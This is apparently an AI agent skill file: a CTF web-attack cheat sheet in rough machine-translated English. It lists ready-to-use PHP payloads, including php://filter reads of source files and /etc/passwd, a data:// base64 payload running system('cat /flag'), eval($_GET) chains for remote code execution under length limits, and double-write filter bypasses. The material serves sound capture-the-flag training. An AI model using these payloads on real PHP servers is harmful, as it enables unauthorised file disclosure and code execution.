---
name: ctf-web
description: CTF WebAttack knowledge base — PHPWeak comparison bypass、Command injection space bypass、evalEcho techniques、SSTIInjection Chain、Deserialization exploit chain、PHPCode auditingchecklist、CommonflagLocation
---

# CTF Web Attack knowledge base

Targeting CTF Web The practical knowledge base of the topic provides**Specific Bypass Value、payload Template、Code auditing checklist**rather than penetration testing methodologies.

**With `web-security-advanced` Difference**:
- `web-security-advanced` → Penetration testing methodology (how to systematically test a Web Application)
- `ctf-web` → CTF Practical knowledge base (PHP What value to use for weak comparison、How to bypass spaces、eval How to echo output)

## Core principles

1. **Exact value is better than methodology** — Provide bypass values that can be used directly and payload, rather than"Can try"The recommendation of
2. **Tool verification** — All payload Must use `fetch` or `python_execute` Tools actually send verification, don't guess the results
3. **Path selection** — When there are multiple utilization paths, the one with the least filtering is preferred.、the simplest
4. **Failure record** — someone payload Record immediately after failure and do not try again

## First-Pass Workflow (CTF Web question standard procedure)

1. access target URL, view the page source code、HTTP head、Cookie
2. **If the source code contains `highlight_file` → use python_execute + strip_tags Extract pure source code**(fetch Output may be misread)
3. examine robots.txt、.git/、.svn/、backup file (index.php.bak、www.zip wait)
4. Directory scan (common:/flag、/admin、/login、/upload、/api)
5. If there is source code → Enter code audit mode (see `php-code-audit-checklist.md`)
6. If there is no source code → Active detection of injection points、Upload point、File contains

## scene routing

| scene | Reference documentation | core content |
|------|---------|---------|
| ⭐ PHP Pseudo-protocol reading files (encountering files containing/When passing the file name as a parameter, try first) | See below「PHP Fake protocol quick check」 | `php://filter` Read the source code directly/flag |
| Source code extraction | `source-code-extraction.md` | strip_tags extract、php://filter、.phps、Backup files、integrity check |
| PHP weak comparison/type bypass | `php-bypass-cheatsheet.md` | 0e beginning MD5 Value list、Array bypass、extract() overwrite |
| ⭐ MD5 Weak comparison collision (`md5(a)==md5(b)` weak comparison) | `php-bypass-cheatsheet.md` | ⚠️ 0e The last must be pure numbers! Use directly `QNKCDZO`+`240610708` Wait for verified value |
| ⭐ preg_replace/str_replace Double write bypass | See below「Double write bypass quick check」 | `NSSNSSCTFCTF` → After replacement = `NSSCTF` |
| Command injection whitespace bypass | `command-injection-bypass.md` | ${IFS}/$IFS$9/</%09/%0a Full table |
| eval/RCE Skill | `eval-and-rce-techniques.md` | system/exec/passthru the difference、highlight_file Output order、No echo takeaway |
| SSTI injection chain | `ssti-injection-chains.md` | Jinja2/Twig/ERB/Mako Wait for injection chain quick check |
| Deserialization exploit chain | `deserialization-playbook.md` | PHP/Java/Python Deserialization、SoapClient CRLF |
| File upload → RCE | `file-upload-to-rce.md` | .htaccess bypass、Log poisoning、multilingual Webshell |
| CTF quick reference | `web-ctf-quick-reference.md` | flag Location、Common chain shapes、response header hint |
| PHP Code audit | `php-code-audit-checklist.md` | input portal→filter→hazard function→Output analysis |

## ⭐ PHP Pseudo-protocol quick check (file contains/When passing the file name as a parameter, try first)

**Trigger condition**: When the question has any of the following characteristics,**Try first php://filter Think of other ways**:

| Trigger characteristics | Example |
|---------|------|
| Parameter accepts file name/path | `?file=xxx` / `?page=xxx` / `?num=xxx` / `?path=xxx` |
| `include` / `require` / `include_once` | There are these functions in the source code |
| Page display source code | `highlight_file()` / `show_source()` |
| Question requirements"read file"or"try to find flag" | Explicitly read the server file |

### pseudo-agreement Payload quick check

```
# 1. read PHP Source code (base64 code, avoid PHP implement)
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=index.php

# 2. read PHP Source code (rot13 coding)
?file=php://filter/read=string.rot13/resource=flag.php

# 3. Read files directly (such as .txt/.log Wait for non PHP document)
?file=php://filter/resource=/etc/passwd

# 4. code execution
?file=php://input  (POST body medium level PHP code)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

### ⚠️ Key reminder

1. **Don't just think about it"bypass", first think about whether you can"Read directly"** — The parameters of many questions accept file names, which can be read directly using the pseudo-protocol. flag.php, no need to bypass any filtering at all
2. **`convert.base64-encode` It is a universal reader** — PHP The file is include will be executed, but base64 It will not be executed after encoding, you can get the source code
3. **The parameter name is not necessarily called `file`** — may be `page`、`num`、`path`、`template` etc., as long as the parameter value is treated as a file path/Name processing may be effective
4. **get base64 for later use `crypto_decode` Tool decoding** — Don’t make up the decoding results by yourself

## common flag Quick location check

**⚠️ RCE After obtaining it, it must be tested according to the following priorities flag location, do not stay in the current directory flag.php:**

```
priority 1(most common): cat /flag
priority 2:           cat /flag.txt
priority 3:           ls /  → Find the root directory flag file name
priority 4:           cat /var/www/html/flag.php
priority 5:           cat /home/ctf/flag
priority 6:           cat /root/flag
Other locations:           /environment, /proc/self/environ, env Order
```

**Notice**:`ls` The default column is the current directory (`/var/www/html/`), root directory `/flag` need `ls /` Only then can you see it.

## common CTF Web Question type quick judgment

| Question characteristics | Possible test points | Recommended reference |
|---------|---------|---------|
| Parameter accepts file name/path | ⭐ **Try first php://filter read flag** | see above「PHP Fake protocol quick check」 |
| The page only has a login box | SQL injection / weak password / Conditional competition | php-bypass-cheatsheet.md |
| The page has code display | Code audit | php-code-audit-checklist.md |
| eval/system words | RCE + space/Keyword bypass | eval-and-rce-techniques.md + command-injection-bypass.md |
| eval + Length limit | RCE + `$_GET` Chain parameter passing around length | See below「RCE + Length limit bypass」 |
| File upload function | Suffix bypass / MIME Bypass | file-upload-to-rce.md |
| Page template rendering | SSTI | ssti-injection-chains.md |
| Serialization/Deserialization | PHP/Java Deserialization | deserialization-playbook.md |
| Yes WAF/Filter prompts | Regex bypass / Encoding bypass | php-bypass-cheatsheet.md + command-injection-bypass.md |

## RCE + Length restriction bypass (preferred strategy)

When `eval()` Yes `strlen()` When Length Limitations Apply (e.g. ≤ 18 Character),**Top recommendation `$_GET` Chained parameter passing**:

### Standard solution

```
?get=eval($_GET['A']);&A=system('cat /flag');
```

**Principle**:
- `eval($_GET['A'])` = 16 Characters, with length restrictions
- The real command is the second one GET Parameters `A` In, there is no length limit
- PHP Will be executed first `eval()`, `$_GET['A']` The value as PHP Code execution.

### Variants

| Length limit | payload | Character Count |
|---------|---------|--------|
| ≤ 18 | `eval($_GET['A']);` | 16 |
| ≤ 18 | `eval($_GET[0]);` | 14 |
| ≤ 16 | `eval($_GET[A]);` | 13(No quotes,PHP Automatic string conversion) |
| ≤ 12 | `$_GET[0]();` | 10(A Pass parameters to function names such as `system`, another parameter passing commands) |

### Precautions
- Don't spend time on shortening payload Up (such as using `?>` Exit PHP Pattern、Using backticks, etc.),**Chained parameter passing is a universal solution**
- Double GET Parameters URL Format:`?get=eval($_GET['A']);&A=system('cat /flag');`
- Use `python_execute` Tools Construct Requests, Rather Than fetch Tools (fetch May not support multiple parameters)

## ⭐ preg_replace / str_replace Double Write Bypass Quick Reference

**Trigger conditions**: Source code contains `preg_replace('/X/', '', $str)` Or `str_replace('X', '', $str)`, and after replacement must `$str === "X"`

### Core principles
Embed the full keyword in the middle of the keywords, replace and delete the inner layer, then the outer layer combines to form the original word.

### General construction formula
```
Input. = First half of the keyword + Keywords + Second half of the keywords
```

### Common filter words quick lookup table

| Filter Keywords | Double-write input | Replacement process | Result |
|-----------|---------|---------|------|
| NSSCTF | `NSSNSSCTFCTF` | Delete in the middleNSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | Delete in the middleflag → fl+ag | `flag` ✅ |
| cat | `cacatt` | Delete the middlecat → ca+t | `cat` ✅ |
| system | `syssystemtem` | Delete the middlesystem → sys+tem | `system` ✅ |
| hack | `hahackck` | Delete the middlehack → ha+ck | `hack` ✅ |
| cmd | `cmcmdd` | Delete the middlecmd → cm+d | `cmd` ✅ |
| exec | `exexecec` | Delete the middleexec → ex+ec | `exec` ✅ |

### ⚠️ Key considerations
1. **Case bypassing does not apply** — Return after replacement `NssCTF`, not equal to `"NSSCTF"`, strict comparison fails
2. **recognition signal** — See `preg_replace('/X/', '', $str)` + `$str === "X"` → Double write immediately
3. **str_replace Same reason** — `str_replace` It is also a one-time replacement, and double writing is equally effective.
4. **multiple substitutions** — If the code is called multiple times `preg_replace`, you may need to write three/Four writes, but CTF Usually just double write
